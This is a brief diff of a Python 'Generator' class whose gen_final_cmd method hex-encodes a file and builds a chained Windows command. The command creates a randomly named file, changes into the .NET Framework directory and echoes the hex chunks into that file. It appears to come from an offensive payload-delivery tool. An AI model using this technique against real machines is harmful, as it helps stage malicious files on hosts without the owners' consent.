@@ -92,14 +92,14 @@ class Generator:
 		return current
 		
 	def gen_final_cmd(self, path):
-		payload = "cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ && "
 		size = 0
-
 		filepath = []
 		filepath.append(self.gen_str(random.randrange(5, 25)))
 		filepath.append(self.gen_str(random.randrange(5, 25)))
-
 		data = self.load_file(path).encode("hex")
+		
+		payload = "echo "" > %s && cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ && " % filepath[0]
+		
 		for chunk in re.findall("." * self.chunk_size, data):
 		        payload += "echo %s >> %s && " % (chunk, filepath[0])
 		        size += self.chunk_size
